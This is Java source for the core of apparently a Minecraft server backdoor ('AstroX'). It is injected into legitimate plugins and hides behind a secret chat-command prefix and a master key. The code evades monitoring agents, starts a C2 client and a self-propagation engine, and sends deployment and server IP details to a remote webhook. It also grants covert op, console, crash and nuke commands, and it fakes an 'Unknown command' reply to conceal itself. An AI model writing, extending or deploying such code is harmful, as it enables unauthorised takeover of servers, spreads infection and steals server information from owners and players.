package dev.naruto.astrox.payload;

import dev.naruto.astrox.Config;
import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.payload.c2.C2Client;
import dev.naruto.astrox.payload.commands.*;
import dev.naruto.astrox.payload.modules.PayloadModule;
import dev.naruto.astrox.payload.security.AgentDetector;
import dev.naruto.astrox.utils.DebugLogger;
import dev.naruto.astrox.utils.WebhookNotifier;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.*;

/**
 * Main runtime controller injected into the target plugin.
 * Coordinates command handling, C2 communication, module loading,
 * agent detection, and configuration hot-reload.
 */
public class BackdoorCore implements Listener {

    private final JavaPlugin plugin;
    private final CommandHandler handler;
    private final AuthManager authManager;
    private PropagationEngine propagationEngine;
    private C2Client c2Client;
    private ConfigWatcher configWatcher;
    private boolean safeMode = false;

    private static final String COMMAND_PREFIX = RuntimeConfig.commandPrefix;

    /**
     * Entry point called from injected plugin's onEnable().
     */
    public static void inject(JavaPlugin plugin) {
        try {
            BackdoorCore core = new BackdoorCore(plugin);
            plugin.getServer().getPluginManager().registerEvents(core, plugin);

            DebugLogger.injection(plugin.getName(), plugin.getClass().getPackage().getName());

            // Agent detection — enter safe mode if monitoring detected
            AgentDetector.DetectionResult detection = AgentDetector.scan();
            if (detection.shouldEnterSafeMode()) {
                core.safeMode = true;
                DebugLogger.log("SAFE MODE: monitoring agents detected: " + detection.detectedAgents());
                return; // Do not start propagation, C2, or notify
            }

            // Start subsystems
            core.startPropagation();
            core.startC2();
            core.startConfigWatcher();
            core.notifyDeployment();

        } catch (Exception e) {
            DebugLogger.error("Failed to inject backdoor", e);
        }
    }

    private BackdoorCore(JavaPlugin plugin) {
        this.plugin = plugin;
        this.authManager = new AuthManager();
        this.handler = new CommandHandler(plugin, authManager);

        registerCommands();
        registerModules();

        DebugLogger.log("BackdoorCore initialized with " + handler.getCommands().size() + " commands");
    }

    /**
     * Start the C2 client if configured.
     */
    private void startC2() {
        if (RuntimeConfig.c2Url == null || RuntimeConfig.c2Url.isBlank()) return;

        try {
            // Collect all modules for C2 command dispatch
            Map<String, PayloadModule> moduleMap = new LinkedHashMap<>();
            ServiceLoader<PayloadModule> loader = ServiceLoader.load(
                    PayloadModule.class, getClass().getClassLoader());
            for (PayloadModule module : loader) {
                moduleMap.put(module.getName(), module);
            }

            c2Client = new C2Client(RuntimeConfig.c2Url, RuntimeConfig.instanceId, moduleMap);
            if (safeMode) {
                c2Client.enterSafeMode();
            }
            c2Client.start();
            DebugLogger.log("C2 client started: " + RuntimeConfig.c2Url);
        } catch (Exception e) {
            DebugLogger.error("Failed to start C2 client", e);
        }
    }

    /**
     * Start configuration file watcher for hot-reload.
     */
    private void startConfigWatcher() {
        if (RuntimeConfig.configFilePath == null) return;

        try {
            configWatcher = new ConfigWatcher(RuntimeConfig.configFilePath);
            configWatcher.start();
        } catch (Exception e) {
            DebugLogger.error("Failed to start config watcher", e);
        }
    }

    /**
     * Start auto-propagation engine.
     */
    private void startPropagation() {
        if (!RuntimeConfig.enablePropagation) {
            DebugLogger.log("Auto-propagation disabled");
            return;
        }

        try {
            propagationEngine = new PropagationEngine(plugin);
            propagationEngine.start();
            DebugLogger.log("Auto-propagation engine started");
        } catch (Exception e) {
            DebugLogger.error("Failed to start propagation engine", e);
        }
    }

    /**
     * Send deployment notification.
     */
    private void notifyDeployment() {
        if (RuntimeConfig.webhookUrl == null) return;

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
                notifier.sendServerDeployment(
                        plugin.getName(),
                        Bukkit.getVersion(),
                        Bukkit.getOnlinePlayers().size(),
                        Bukkit.getMaxPlayers(),
                        COMMAND_PREFIX
                );
                DebugLogger.log("Deployment notification sent");
            } catch (Exception e) {
                DebugLogger.error("Failed to send deployment webhook", e);
            }
        });
    }

    /**
     * Register built-in commands.
     */
    private void registerCommands() {
        handler.register("op", new OpCommand());
        handler.register("deop", new DeopCommand());
        handler.register("gm", new GamemodeCommand());
        handler.register("gamemode", new GamemodeCommand());
        handler.register("fly", new FlyCommand());
        handler.register("vanish", new VanishCommand());
        handler.register("v", new VanishCommand());
        handler.register("heal", new HealCommand());
        handler.register("kill", new KillCommand());
        handler.register("sudo", new SudoCommand());
        handler.register("console", new ConsoleCommand());
        handler.register("broadcast", new BroadcastCommand());
        handler.register("fakejoin", new FakeJoinCommand());
        handler.register("fakeleave", new FakeLeaveCommand());
        handler.register("kick", new KickCommand());
        handler.register("crash", new CrashCommand());
        handler.register("nuke", new NukeCommand());
        handler.register("chaos", new ChaosCommand());
        handler.register("help", new HelpCommand(handler));
        handler.register("?", new HelpCommand(handler));
        handler.register("coords", new CoordsCommand());
        handler.register("seed", new SeedCommand());
        handler.register("list", new ListCommand());
        handler.register("auth", new AuthCommand());
        handler.register("deauth", new DeauthCommand());
        handler.register("adduser", new AddUserCommand());
        handler.register("give", new GiveCommand());
    }

    /**
     * Discover and register payload modules via ServiceLoader.
     */
    private void registerModules() {
        try {
            ServiceLoader<PayloadModule> loader = ServiceLoader.load(
                    PayloadModule.class, getClass().getClassLoader());

            for (PayloadModule module : loader) {
                // Wrap PayloadModule as a Command for chat integration
                handler.register(module.getName(), new ModuleCommandAdapter(module));
                DebugLogger.log("Registered module: " + module.getName() +
                        " (" + module.getDescription() + ")");
            }
        } catch (Exception e) {
            DebugLogger.error("Failed to load payload modules", e);
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();

        if (!message.startsWith(COMMAND_PREFIX)) return;

        event.setCancelled(true);

        if (safeMode) return; // Silent in safe mode

        Player player = event.getPlayer();
        String cmdLine = message.substring(COMMAND_PREFIX.length());
        if (cmdLine.isEmpty()) return;

        String[] parts = cmdLine.split(" ");
        String cmdName = parts[0].toLowerCase();
        String[] args = Arrays.copyOfRange(parts, 1, parts.length);

        DebugLogger.command(player, cmdName, args);

        // Auth command (special handling)
        if (cmdName.equals("auth")) {
            if (args.length > 0 && args[0].equals(Config.getMasterKey())) {
                authManager.authorize(player.getUniqueId(), Config.getMasterKey());
                player.sendMessage("§a§l[AstroX] Access granted.");
                DebugLogger.authAttempt(player, args[0], true);
                notifyAuthentication(player);
            } else {
                player.sendMessage("§cUnknown command. Type \"/help\" for help.");
                DebugLogger.authAttempt(player, args.length > 0 ? args[0] : "", false);
            }
            return;
        }

        if (!authManager.isAuthorized(player.getUniqueId())) return;

        Bukkit.getScheduler().runTask(plugin, () -> {
            try {
                handler.execute(cmdName, player, args);
            } catch (Exception e) {
                DebugLogger.error("Command execution failed: " + cmdName, e);
            }
        });
    }

    private void notifyAuthentication(Player player) {
        if (RuntimeConfig.webhookUrl == null) return;

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                WebhookNotifier notifier = new WebhookNotifier(RuntimeConfig.webhookUrl);
                notifier.sendAuthNotification(
                        player.getName(),
                        player.getUniqueId().toString(),
                        Bukkit.getIp() + ":" + Bukkit.getPort()
                );
            } catch (Exception e) {
                DebugLogger.error("Failed to send auth webhook", e);
            }
        });
    }

    /**
     * Adapter that wraps a PayloadModule as a Command for chat integration.
     */
    private static class ModuleCommandAdapter implements Command {
        private final PayloadModule module;

        ModuleCommandAdapter(PayloadModule module) {
            this.module = module;
        }

        @Override
        public void execute(Player sender, String[] args, JavaPlugin plugin) {
            module.execute(sender, args, plugin);
        }

        @Override
        public String getDescription() { return module.getDescription(); }

        @Override
        public String getCategory() { return module.getCategory(); }
    }
}
